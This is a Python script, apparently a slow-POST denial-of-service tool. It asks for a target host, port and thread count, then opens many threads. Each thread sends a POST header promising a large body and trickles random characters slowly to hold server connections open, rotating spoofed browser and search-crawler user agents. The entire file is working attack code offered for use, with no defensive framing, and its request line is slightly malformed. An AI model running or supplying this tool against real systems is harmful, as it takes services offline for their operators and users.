import os,socket,random,string,time
from threading import Thread
stop = False
#User agents to "identify" where the data is coming from
User_agent = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
              "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
              "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
              "Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
              "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)", 
               "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
               "Opera/9.20 (Windows NT 6.0; U; en)",
               "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)", 
               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)", 
               "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0", 
               "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
               "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13" 
               "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
               "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
               "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
               "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
               "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", 
               "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
               "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
               "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
               "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]


#Creates a subclass of Thread
#class used to layout gassing methods and connection attributes
class Gas(Thread):

    #sets up connections to a host 
    def __init__(self,ip,port):
        #Inherits the Superclass Threads' methods
        Thread.__init__(self)
        #sets up the host con attribute
        self.host = ip
        #sets up the port con attribute
        self.port = port
        #sets up the socket for data transfer
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


     #Method that sends the data   
    def send_Gas(self):
        global stop
        #Sends this to the host to inform it of what it should do and where data iis coming from
        self.sock.send("POST /HTTP/1.1\r\n".encode("utf-8"))
        self.sock.send("Host {}\r\n".format(self.host).encode("utf-8"))
        self.sock.send("User-Agent: {}\r\n".format(random.choice(User_agent)).encode("utf-8"))
        self.sock.send("Connection: keep-alive\r\n".encode("utf-8"))
        self.sock.send("Keep-Alive: 900\r\n".encode("utf-8"))
        self.sock.send("Content-Length: 10000\r\n".encode("utf-8"))
        self.sock.send("Content-Type: application/x-www-form-urlencoded\r\n\r\n".encode("utf-8"))
        #sends the data on a loop
        for i in range(0,9999):
            if stop:
                break
            send = random.choice(string.ascii_letters+string.digits)
            print("Gassing with[{}\n".format(send))
            send = send.encode("utf-8")
            self.sock.send(send)
            time.sleep(random.uniform(0.1,3))
        #closes the socket connections after all data is sent
        self.sock.close()


#method to run the all the other methods on a loop
    def run(self):
        count = 0
        #Main loop
        while True:
            #loop to connect to host using the classes connection attributes
            while True:
                try:
                    self.sock.connect((self.host,self.port))
                    print("Sending Gas to[{}\n".format(self.host))
                    break
                except:
                    print("Gas can didnt open on [{}...\n".format(self.host))
                    count +=1
                    time.sleep(3)
                    if count >= 5:
                        break
                    else:
                        continue
            #loop that tries to call the data sending method 
            while True:
                try:
                    self.send_Gas()
                except:
                    #this gets an acception in case of a broken thread or connection
                    print("No more gas\n")
                    print("Refueling\n")
                    #reconnects to host 
                    self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    break
                time.sleep(0.2)
                pass
#main function that runs everything
def Main(ip,port,ts):
    try:
        ip =  socket.gethostbyname(ip)
    except socket.error:
        pass
#gets number of threads to use
    if ts == '':
        #default threads is 100
        ts = 100
    else:
        ts = int(ts)
    #gives info on target, port, and amount of threads
    print("Target[{0} Port[{1}".format(ip,port))
    print("Threads[{}".format(ts))
    time.sleep(10)
    #Threads or how many sockets are open and connected to the host 
    threads = []
    #Executes code on every thread
    for i in range(ts):
        #Creates a object using the class created
        s = Gas(ip,port)
        #adds the open connection in the object to a list of threads 
        threads.append(s)
        #starts the object on a thread
        s.start()
    #if there are more than 0 threads the loop will run
    while len(threads) > 0:
        #creates a list of threads and appends a thread aslong as the connection is still alive
        threads = [s.join(1) for s in threads if s is not None and s.is_alive()]
Ip = input("Enter target IP addr or site[")
Port = int(input("Enter target Port["))
Threads = input("Enter Threads (You can leave this blank)[")
Main(Ip,Port,Threads)
